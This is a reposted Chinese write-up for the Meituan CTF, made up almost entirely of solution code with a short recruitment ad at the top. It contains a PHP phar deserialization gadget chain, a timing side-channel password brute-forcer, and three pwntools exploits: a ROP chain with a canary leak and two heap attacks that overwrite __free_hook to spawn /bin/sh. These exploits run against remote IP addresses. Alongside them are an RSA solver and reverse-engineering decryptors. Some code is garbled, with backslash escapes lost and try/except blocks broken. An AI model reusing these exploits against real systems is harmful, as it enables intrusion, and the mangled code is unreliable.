# 美团CTF-WriteUp

> 原文: https://www.ctfiot.com/16962.html
> ID: 16962

end

招新小广告

ChaMd5 Venom 招收大佬入圈

新成立组IOT+工控+样本分析+AI 长期招新

欢迎联系admin@chamd5.org


```
<?php
$dbaddr = "127.0.0.1";
$dbuser = "root";
$dbpass = "root";
$dbname = "xx";
$db = new mysqli($dbaddr, $dbuser, $dbpass, $dbname);

abstract class Users {
    public $db;
    abstract public function verify_user($username, $password);
    abstract public function check_user_exist($username);
    abstract public function add_user($username, $password);
    abstract protected function eval();
    public function test() {
        $this->eval();
    }
}

class User extends Users {
    public $db;
    private $func;
    protected $param;
    public function __construct($func,$param) {
        $this->func=$func;
        $this->param=$param;
    }
    public function verify_user($username, $password) {
        if (!$this->check_user_exist($username)) {
            return false;
        }
        $password = md5($password . "7a28b8eb92558ea2");
        $stmt = $this->db->prepare("SELECT `password` FROM `users` WHERE `username` = ?;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->bind_result($expect);
        $stmt->fetch();
        if (isset($expect) && $expect === $password) {
            return true;
        }
        return false;
    }
    public function check_user_exist($username) {
        $stmt = $this->db->prepare("SELECT `username` FROM `users` WHERE `username` = ? LIMIT 1;");
        $stmt->bind_param("s", $username);
        $stmt->execute();
        $stmt->store_result();
        $count = $stmt->num_rows;
        if ($count === 0) {
            return false;
        }
        return true;
    }
    public function add_user($username, $password) {
        if ($this->check_user_exist($username)) {
            return false;
        }
        $password = md5($password . "7a28b8eb92558ea2");
        $stmt = $this->db->prepare("INSERT INTO `users` (`id`, `username`, `password`) VALUES (NULL, ?, ?);");
        $stmt->bind_param("ss", $username, $password);
        $stmt->execute();
        return true;
    }
    protected function eval() {
        if (is_array($this->param)) {
            ($this->func)($this->param);
        } else {
            die("no!");
        }
    }
}

class Welcome{
    public $file;
    public $username;
    public $password;
    public $verify;
    public $greeting;
}

class File {
    public $filename;
    public $fileext;
    public $basename;
}

class Logs {
    public $log;
    public function log() {
        $log = $_GET['log'];
        if(preg_match("/rot13|base|toupper|encode|decode|convert|bzip2/i", $log)) {
            die("hack!");
        }
        file_put_contents($log,'<?php exit();'.$log);
    }
}
$func = "call_user_func";
$param = array("Logs","log");
$a =new Welcome();
$b = new Welcome();
$c = new File();
$d= new User($func,$param);
$c->filename=$d;
$a->verify=$c;
$a->username="/etc/passwd";
$b->username=$a;
@unlink("1.png");
$phar = new Phar("phar.phar");
$phar->startBuffering();
$phar->setStub("<?php __HALT_COMPILER(); ?>");
$phar->setMetadata($b); 
$phar->addFromString("test.txt", "test"); 
$phar->stopBuffering();
rename("phar.phar","1.png");
from pwn import *
import time

import string

table =  string.lowercase + string.uppercase + string.digits
table = string.printable
sh = remote("123.57.132.168", 14584)
context.log_level = 'debug'
pswd=""
table='''0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~'''
table='''89abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&'()*+,-./:;<=>?@[\]^_`{|}~'''

for j in range(0,len(table),8):
 tablee = table[j:j+8]
 sh = remote("123.57.132.168", 14584)
 for i in tablee:
  temp = b"#G.5~1s" + i + "aa"
  sh.recvuntil("[~]Please input your password:n")
  s = time.time()
  sh.sendline(temp)
  res = sh.recvuntil("False!n")
  spend = time.time() - s
  print(spend)
  if 15 > spend > 12:
   pswd = temp
   print(pswd)
   exit()
  else:
   pass
 sh.close()
from Crypto.Util.number import *
from tqdm import tqdm
def decrypt_RSA(c, e, p, q):
    phi = (p-1) * (q-1)
    d = inverse(e, phi)
    m = pow(c, d, p*q)
    print(long_to_bytes(m))
n = 98027132963374134222724984677805364225505454302688777506193468362969111927940238887522916586024601699661401871147674624868439577416387122924526713690754043
c = 42066148309824022259115963832631631482979698275547113127526245628391950322648581438233116362337008919903556068981108710136599590349195987128718867420453399
low = str(n)[-18:]
high = str(n)[:18]
pq_prob = []
for i in range(10):
    for j in range(10):
        for k in range(10):
            pq_prob.append(int(high + str(i) + str(j) + str(k) + low))
        
for x in tqdm(pq_prob):
    f = factor(x)
    if (len(f) == 2 and f[0][0].nbits() == 64):
        p, q = f[0][0], f[1][0]
        break
P = int(str(p) + str(p))
Q = int(str(q) + str(q))
PP = int(str(P) + str(Q))
QQ = int(str(Q) + str(P))
N = PP * QQ
print(N == n)
decrypt_RSA(c, 65537, PP, QQ)
    #coding:
utf-8
from pwn import *

context.log_level='debug'
elfelf='./babyrop'
elf=ELF(elfelf)
context.arch=elf.arch
gdb_text='''
 '''

if len(sys.argv)==1 :
 io=process(elfelf)
 gdb_open=1
 libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
 # ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
 one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]

elif sys.argv[1]=='2' :
 io=process(elfelf)
 gdb_open=0
 libc=ELF('/lib/x86_64-linux-gnu/libc-2.23.so')
 # ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
 one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]

else :
 io=remote('47.93.163.42',12711)
 gdb_open=0
 libc=ELF('./libc-2.27.so')
 # ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
 one_gadgaet=[0x45226,0x4f432,0x10a41c]

def gdb_attach(io,a):
 if gdb_open==1 :
  gdb.attach(io,a)

io.recv()
io.send('a'*25)
io.recvuntil('a'*25)
canary='x00'+io.recv(7)
io.recv()
io.sendline(str(0x4009AE))

leave=0x400759

pay='a'*0x18+canary+p64(0x601c00)+p64(0x40072E)

io.send(pay)

pay=p64(0x400913)+p64(elf.got['puts'])+p64(elf.plt['puts'])+canary+p64(0x601c00+0x28)+p64(0x40072E)

io.send(pay)

pay=p64(0x400913)+p64(elf.got['puts'])+p64(elf.plt['puts'])+p64(0x400717)

io.send(pay)

libc_base=u64(io.recvuntil('x7f')[-6:]+'x00x00')-libc.sym['puts']
libc.address=libc_base
bin_sh_addr=libc.search('/bin/shx00').next()
system_addr=libc.sym['system']
free_hook_addr=libc.sym['__free_hook']

pay=p64(0x400913)+p64(elf.got['puts'])+p64(elf.plt['puts'])+canary+p64(0x601c00+0x28)+p64(libc_base+one_gadgaet[2])

io.send(pay)

success('libc_base:'+hex(libc_base))
# success('heap_base:'+hex(heap_base))
gdb_attach(io,gdb_text)

io.interactive()
    #coding:
utf-8
import sys
from pwn import *
from ctypes import CDLL
context.log_level='debug'
elfelf='./Blindbox'
    #context.arch='amd64'
while True :
 # try :
  elf=ELF(elfelf)
  context.arch=elf.arch

  gdb_text='''
   telescope $rebase(0x202040) 16
   '''

  if len(sys.argv)==1 :
   clibc=CDLL('/lib/x86_64-linux-gnu/libc-2.31.so')
   io=process(elfelf)
   gdb_open=1
   # io=process(['./'],env={'LD_PRELOAD':'./'})
   clibc.srand(0)
   libc=ELF('./libc-2.31.so')
   # ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
   one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]

  else :
   clibc=CDLL('/lib/x86_64-linux-gnu/libc-2.31.so')
   io=remote('123.57.132.168',45442)
   gdb_open=0
   clibc.srand((0))
   libc=ELF('./libc-2.31.so')
   # ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
   one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]

  def gdb_attach(io,a):
   if gdb_open==1 :
    gdb.attach(io,a)

  io.recv()
  io.send('aaaa')
  io.recv()
  io.sendline(str(0x88))
  io.recv()
  io.sendline(str(0xf8))
  io.recv()
  io.sendline(str(0x218))

  def choice(a):
   io.sendlineafter('>> ',str(a))

  def add(a,b):
   choice(1)
   io.sendlineafter('choosen',str(a))
   io.sendlineafter(': n',str(b))
 
  def edit(a,b):
   choice(4)
   io.sendlineafter('?n',str(a))
   io.sendafter('content:n',b)

  def show(a):
   choice(3)
   io.sendlineafter('?n',str(a))

  def delete(a):
   choice(2)
   io.sendlineafter('?n',str(a))

  add(1,1)
  for i in range(7):
   add(3,3)
   delete(3)
  
  add(3,3)
  add(3,2)
  delete(3)
  show(3)

  data=io.recvuntil('--------',drop=True)

  if "you can't open it" in data:
   io.close()
   continue
 
  libc_base=u64(data[-8:])-libc.sym['__malloc_hook']-96-0x10
  libc.address=libc_base
  bin_sh_addr=libc.search('/bin/shx00').next()
  system_addr=libc.sym['system']
  free_hook_addr=libc.sym['__free_hook']

  io.sendline('6')

  for i in range(8):
   io.sendlineafter('Please guess>',str(system_addr^int(clibc.rand())))

  io.sendlineafter('Congratulations!!!n','cat flag')
  
  
  success('libc_base:'+hex(libc_base))
  # success('heap_base:'+hex(heap_base))

  # gdb_attach(io,gdb_text)
  io.interactive()

 # 
except Exception as e:
 #  io.close()
 #  continue
 # else:
 #  continue
    #coding:
utf-8
import sys
from pwn import *
from ctypes import CDLL
context.log_level='debug'
elfelf='./bookshop'
    #context.arch='amd64'
while True :
 # try :
  elf=ELF(elfelf)
  context.arch=elf.arch

  gdb_text='''
   telescope $rebase(0x202040) 16
   '''

  if len(sys.argv)==1 :
   clibc=CDLL('/lib/x86_64-linux-gnu/libc-2.31.so')
   io=process(elfelf)
   gdb_open=1
   # io=process(['./'],env={'LD_PRELOAD':'./'})
   clibc.srand(clibc.time(0))
   libc=ELF('./libc-2.31.so')
   # ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
   one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]

  else :
   # clibc=CDLL('/lib/x86_64-linux-gnu/libc-2.31.so')
   io=remote('123.57.132.168',15875)
   gdb_open=0
   # clibc.srand(clibc.time(0))
   libc=ELF('./libc-2.31.so')
   # ld = ELF('/lib/x86_64-linux-gnu/ld-2.23.so')
   one_gadgaet=[0x45226,0x4527a,0xf03a4,0xf1247]

  def gdb_attach(io,a):
   if gdb_open==1 :
    gdb.attach(io,a)
  

  def choice(a):
   io.sendlineafter('>> ',str(a))

  def add(b):
   choice(1)
   io.sendlineafter('> ',b)
 
  def show(a):
   choice(3)
   io.sendlineafter('?n',str(a))

  def delete(a):
   choice(2)
   io.sendlineafter('?n',str(a))

  io.recv()
  io.sendline(str(0x68))

  for i in range(0x9):
   add(p64(0x71)*12)

  for i in range(0x7):
   delete(0x8-i)

  show(0x3)
  io.recvuntil('Content: ')
  heap_base=u64(io.recv(6)+'x00x00')
  
  delete(0)
  io.sendline('1'*0x500)
  show(0)
 
  libc_base=u64(io.recvuntil('x7f')[-6:]+'x00x00')-libc.sym['__malloc_hook']-96-0x10-0x60
  libc.address=libc_base
  bin_sh_addr=libc.search('/bin/shx00').next()
  system_addr=libc.sym['system']
  free_hook_addr=libc.sym['__free_hook']

  delete(0)
  delete(1)
  delete(0)

  for i in range(0x7):
   add(p64(0x71)*12)

  add(p64(free_hook_addr))
  add('/bin/shx00')
  add('/bin/shx00')
  add(p64(system_addr))

  delete(18)

  success('libc_base:'+hex(libc_base))
  success('heap_base:'+hex(heap_base))

  gdb_attach(io,gdb_text)
  io.interactive()

 # 
except Exception as e:
 #  io.close()
 #  continue
 # else:
 #  continue
str=[0x3E, 0xCD, 0xAA, 0x8E, 0x96, 0x1F, 0x89, 0xCD, 0xDB, 0xF1,
  0x70, 0xF2, 0xA9, 0x9C, 0xC2, 0x8B, 0xF2, 0xFE, 0xAD, 0x8B,
  0x58, 0x7C, 0x2F, 0x03, 0x4A, 0x65, 0x31, 0x89, 0x76, 0x57,
  0x88, 0xDF, 0xB8, 0xE9, 0x01, 0xE9, 0xDE, 0xE5, 0x86, 0x68,
  0x8F, 0x24, 0xD3, 0x5A]
key=[0x58,0xA1,0xCB,0xE9,0xED,0x2C,0xEC,0xFB,0xE9,0xC4,0x16,0x97,0x99,0xB1,0xA4,0xE9,0xC3,0xC6,0x80,0xBF,0x3E,0x44,0x18,0x2E,
0x73,0x52,0x56,0xB8,0x5B,0x66,0xED,0xBC,0x8A,0xD8,0x36,0x8F,0xE6,0xD3,0xB1,0x51,0xB9,0x59,0xD3,0x5A]
flag=''

for i in range(len(key)):
    flag+=chr(str[i]^key[i])
print(flag)
#0x58,0xA1,0xCB,0xE9,0XED,0X2C,0xEC,0xFB,0xE9,0xC4,0x16,0x97,0x99,0xB1,0xA4,0xE9,0xC3,0xC6,0x80,0xBF,0x3E,0x44,0x18,0x2E
#0x73,0x56,0xB8,0x5B,0x66,0xED,0xBC,0x8A,0xD8,0x3,0x8F,0xE6,0xD3,0xB1,0x51,0xB9,0x59,0xD3,0x5A
UPX0:
00512159                 lea     ecx, [ebp+var_28]
UPX0:
0051215C                 call    sub_512420
UPX0:
00512161                 mov     [ebp+var_44], eax
UPX0:
00512164                 sub     esp, 20h
UPX0:
00512167                 mov     ecx, [ebp+var_44]
UPX0:
0051216A                 push    33h ; '3'
UPX0:
0051216C                 call    $+5
UPX0:
00512171                 add     [esp+84h+var_84], 5
UPX0:
00512175                 retf
with open('wow1.exe','rb') as f:
   d=f.read()
   code=d[5494:
5494+0x2351-0x2176] # 用d.find找到目标代码位置
import capstone as ct
md=ct.Cs(ct.CS_ARCH_X86,ct.CS_MODE_64)
for i in md.disasm(code,0x402176):
   print('0x%x:t%st%s'%(i.address,i.mnemonic,i.op_str))
0x402176:       mov     qword ptr [rsp + 8], rbx
0x40217b:       mov     qword ptr [rsp + 0x10], rbp
0x402180:       mov     qword ptr [rsp + 0x18], rsi
0x402185:       mov     qword ptr [rsp + 0x20], rdi
0x40218a:       push    r14
0x40218c:       push    r15
0x40218e:       mov     r9d, dword ptr [rcx + 0x20]
0x402192:       mov     r14, rcx
0x402195:       mov     ebp, 0xc
0x40219a:       xor     esi, esi
0x40219c:       nop     word ptr [rax + rax]
0x4021a6:       add     esi, 0x67452301
0x4021ac:       lea     rdi, [r14 + 4]
0x4021b0:       mov     ebx, esi
0x4021b2:       mov     r10, r14
0x4021b5:       shr     ebx, 2
0x4021b8:       xor     r11d, r11d
0x4021bb:       nop     word ptr [rax + rax]
0x4021c6:       mov     r8d, dword ptr [rdi]
0x4021c9:       mov     eax, ebx
0x4021cb:       xor     eax, r11d
0x4021ce:       and     eax, 3
0x4021d1:       je      0x40223a
0x4021d3:       sub     eax, 1
0x4021d6:       je      0x40221e
0x4021d8:       sub     eax, 1
0x4021db:       je      0x402202
0x4021dd:       cmp     eax, 1
0x4021e0:       jne     0x402270
0x4021e6:       mov     eax, r9d
0x4021e9:       lea     edx, [r8*4]
0x4021f1:       shr     eax, 5
0x4021f4:       xor     edx, eax
0x4021f6:       mov     eax, r9d
0x4021f9:       xor     r9d, 0xc3d2e1f0
0x402200:       jmp     0x402254
0x402202:       mov     eax, r9d
0x402205:       lea     edx, [r8*4]
0x40220d:       shr     eax, 5
0x402210:       xor     edx, eax
0x402212:       mov     eax, r9d
0x402215:       xor     r9d, 0x98badcfe
0x40221c:       jmp     0x402254
0x40221e:       mov     eax, r9d
0x402221:       lea     edx, [r8*4]
0x402229:       shr     eax, 5
0x40222c:       xor     edx, eax
0x40222e:       mov     eax, r9d
0x402231:       xor     r9d, 0x10325476
0x402238:       jmp     0x402254
0x40223a:       mov     eax, r9d
0x40223d:       lea     edx, [r8*4]
0x402245:       shr     eax, 5
0x402248:       xor     edx, eax
0x40224a:       mov     eax, r9d
0x40224d:       xor     r9d, 0xefcdab89
0x402254:       mov     ecx, r8d
0x402257:       shl     eax, 4
0x40225a:       shr     ecx, 3
0x40225d:       xor     r8d, esi
0x402260:       add     r8d, r9d
0x402263:       xor     ecx, eax
0x402265:       add     edx, ecx
0x402267:       xor     edx, r8d
0x40226a:       add     dword ptr [r10], edx
0x40226d:       mov     r9d, dword ptr [r10]
0x402270:       inc     r11d
0x402273:       add     rdi, 4
0x402277:       add     r10, 4
0x40227b:       cmp     r11d, 8
0x40227f:       jb      0x4021c6
0x402285:       mov     r8d, dword ptr [r14]
0x402288:       xor     ebx, r11d
0x40228b:       and     ebx, 3
0x40228e:       je      0x4022f7
0x402290:       sub     ebx, 1
0x402293:       je      0x4022db
0x402295:       sub     ebx, 1
0x402298:       je      0x4022bf
0x40229a:       cmp     ebx, 1
0x40229d:       jne     0x40232f
0x4022a3:       mov     eax, r9d
0x4022a6:       lea     edx, [r8*4]
0x4022ae:       shr     eax, 5
0x4022b1:       xor     edx, eax
0x4022b3:       mov     eax, r9d
0x4022b6:       xor     r9d, 0xc3d2e1f0
0x4022bd:       jmp     0x402311
0x4022bf:       mov     eax, r9d
0x4022c2:       lea     edx, [r8*4]
0x4022ca:       shr     eax, 5
0x4022cd:       xor     edx, eax
0x4022cf:       mov     eax, r9d
0x4022d2:       xor     r9d, 0x98badcfe
0x4022d9:       jmp     0x402311
0x4022db:       mov     eax, r9d
0x4022de:       lea     edx, [r8*4]
0x4022e6:       shr     eax, 5
0x4022e9:       xor     edx, eax
0x4022eb:       mov     eax, r9d
0x4022ee:       xor     r9d, 0x10325476
0x4022f5:       jmp     0x402311
0x4022f7:       mov     eax, r9d
0x4022fa:       lea     edx, [r8*4]
0x402302:       shr     eax, 5
0x402305:       xor     edx, eax
0x402307:       mov     eax, r9d
0x40230a:       xor     r9d, 0xefcdab89
0x402311:       mov     ecx, r8d
0x402314:       shl     eax, 4
0x402317:       shr     ecx, 3
0x40231a:       xor     r8d, esi
0x40231d:       add     r8d, r9d
0x402320:       xor     ecx, eax
0x402322:       add     edx, ecx
0x402324:       xor     edx, r8d
0x402327:       add     dword ptr [r14 + 0x20], edx
0x40232b:       mov     r9d, dword ptr [r14 + 0x20]
0x40232f:       add     ebp, -1
0x402332:       jne     0x4021a6
0x402338:       mov     rbx, qword ptr [rsp + 0x18]
0x40233d:       mov     rbp, qword ptr [rsp + 0x20]
0x402342:       mov     rsi, qword ptr [rsp + 0x28]
0x402347:       mov     rdi, qword ptr [rsp + 0x30]
0x40234c:       pop     r15
0x40234e:       pop     r14
int __cdecl main(int argc, const char **argv, const char **envp)
{
 unsigned int *v3; // rcx
 unsigned int v4; // er9
 int v5; // ebp
 unsigned int v6; // esi
 unsigned int *v7; // rdi
 unsigned int *v8; // r10
 unsigned int v9; // ebx
 unsigned int j; // er11
 unsigned int v11; // er8
 int result; // eax
 int v13; // edx
 unsigned int v14; // eax
 unsigned int v15; // er9
 unsigned int v16; // er8
 int v17; // ebx
 int v18; // ebx
 int v19; // ebx
 int v20; // edx
 unsigned int v21; // eax
 unsigned int v22; // er9
 int i; // [rsp+Ch] [rbp-4h]
 __int64 *vars0; // [rsp+10h] [rbp+0h] BYREF
 vars0 = (__int64 *)&vars0;
 v4 = v3[8];
 v5 = 12;
 v6 = 0;
 do
 {
   v6 += 1732584193;
   v7 = v3 + 1;
   v8 = v3;
   v9 = v6 >> 2;
   for ( j = 0; j < 8; ++j )
   {
     v11 = *v7;
     if ( (((unsigned __int8)j ^ (unsigned __int8)v9) & 3) != 0 )
     {
       if ( (((unsigned __int8)j ^ (unsigned __int8)v9) & 3) == 1 )
       {
         v13 = (v4 >> 5) ^ (4 * v11);
         v14 = v4;
         v15 = v4 ^ 0x10325476;
       }
       else
       {
         result = (((unsigned __int8)j ^ (unsigned __int8)v9) & 3) - 2;
         if ( (((unsigned __int8)j ^ (unsigned __int8)v9) & 3) == 2 )
         {
           v13 = (v4 >> 5) ^ (4 * v11);
           v14 = v4;
           v15 = v4 ^ 0x98BADCFE;
         }
         else
         {
           if ( (((unsigned __int8)j ^ (unsigned __int8)v9) & 3) != 3 )
             goto _lab_0x402270;
           v13 = (v4 >> 5) ^ (4 * v11);
           v14 = v4;
           v15 = v4 ^ 0xC3D2E1F0;
         }
       }
     }
     else
     {
       v13 = (v4 >> 5) ^ (4 * v11);
       v14 = v4;
       v15 = v4 ^ 0xEFCDAB89;
     }
     result = 16 * v14;
     *v8 += (v15 + (v6 ^ v11)) ^ ((result ^ (v11 >> 3)) + v13);
     v4 = *v8;
_lab_0x402270:
     ++v7;
     ++v8;
   }
   v16 = *v3;
   v17 = ((unsigned __int8)j ^ (unsigned __int8)v9) & 3;
   if ( !v17 )
   {
     v20 = (v4 >> 5) ^ (4 * v16);
     v21 = v4;
     v22 = v4 ^ 0xEFCDAB89;
     goto _lab_0x402311;
   }
   v18 = v17 - 1;
   if ( !v18 )
   {
     v20 = (v4 >> 5) ^ (4 * v16);
     v21 = v4;
     v22 = v4 ^ 0x10325476;
     goto _lab_0x402311;
   }
   v19 = v18 - 1;
   if ( !v19 )
   {
     v20 = (v4 >> 5) ^ (4 * v16);
     v21 = v4;
     v22 = v4 ^ 0x98BADCFE;
_lab_0x402311:
     result = 16 * v21;
     v3[8] += (v22 + (v6 ^ v16)) ^ ((result ^ (v16 >> 3)) + v20);
     v4 = v3[8];
     goto _lab_0x40232f;
   }
   if ( v19 == 1 )
   {
     v20 = (v4 >> 5) ^ (4 * v16);
     v21 = v4;
     v22 = v4 ^ 0xC3D2E1F0;
     goto _lab_0x402311;
   }
_lab_0x40232f:
   --v5;
 }
 while ( v5 );
 return result;
}
    #include <stdio.h>
    #include <stdlib.h>
    #include 
    #include <string.h>
// #include "defs.h"
    #include <stdint.h>

void decrypt(uint32_t *inp)
{
  uint32_t v6 = 0x67452301 * 12, v9, v20, v21, v22, inp8, *inp0, *inp1, v13, v14, v15;
  uint32_t cnt = 12;
  inp8 = inp[8];
  do
  {
    v9 = v6 >> 2;
    int32_t j = 8;
    inp8 = inp[7];
    v20 = (inp8 >> 5) ^ (4 * inp[0]);
    v21 = inp8;
    switch ((j ^ v9) & 3)
    {
    case 0:
      v22 = inp8 ^ 0xEFCDAB89;
      break;
    case 1:
      v22 = inp8 ^ 0x10325476;
      break;
    case 2:
      v22 = inp8 ^ 0x98BADCFE;
      break;
    case 3:
      v22 = inp8 ^ 0xC3D2E1F0;
      break;
    }
    inp[8] -= (v22 + (v6 ^ inp[0])) ^ ((16 * v21 ^ (inp[0] >> 3)) + v20);
    inp0 = inp + 7;
    inp1 = inp + 8;
    inp8=inp[6];
    for (j = 7; j >= 0; j--)
    {
      v13 = (inp8 >> 5) ^ (4 * *inp1);
      v14 = inp8;
      switch ((j ^ v9) & 3)
      {
      case 0:
        v15 = inp8 ^ 0xEFCDAB89;
        break;
      case 1:
        v15 = inp8 ^ 0x10325476;
        break;
      case 2:
        v15 = inp8 ^ 0x98BADCFE;
        break;
      case 3:
        v15 = inp8 ^ 0xC3D2E1F0;
        break;
      }
      *inp0 -= (v15 + (v6 ^ *inp1)) ^ ((16 * v14 ^ (*inp1 >> 3)) + v13);
      --inp0;
      
      if(inp0==inp)inp8=inp[8];
      else inp8 = *(inp0 - 1);
      --inp1;
    }
    --cnt;
    v6 -= 0x67452301;
  } while (cnt);
}

int main()
{
  uint8_t target[] = {0xf5, 0x58, 0xf7, 0xd8, 0xdb, 0x49, 0x68, 0x52, 0x63, 0x25, 0xd7, 0xe2, 0xac, 0xef, 0x5e, 0x48, 0xc6, 0x4b, 0x8f, 0x60, 0x6a, 0xf7, 0x59, 0x58, 0xa3, 0x65, 0x35, 0xb0, 0xc1, 0x91, 0x40, 0x3e, 0x9a, 0x5b, 0xdb, 0xd3};
  printf("start...n");
  decrypt((uint32_t *)target);
  printf("okn");
  printf("%sn", target);
}
```


---
## 附图

![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/8-1639550492.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/10-1639550493.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/5-1639550493.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/0-1639550493.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/6-1639550493.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/6-1639550493-1.png)
![](https://ctfiot.oss-cn-beijing.aliyuncs.com/uploads/2021/12/5-1639550493.jpeg)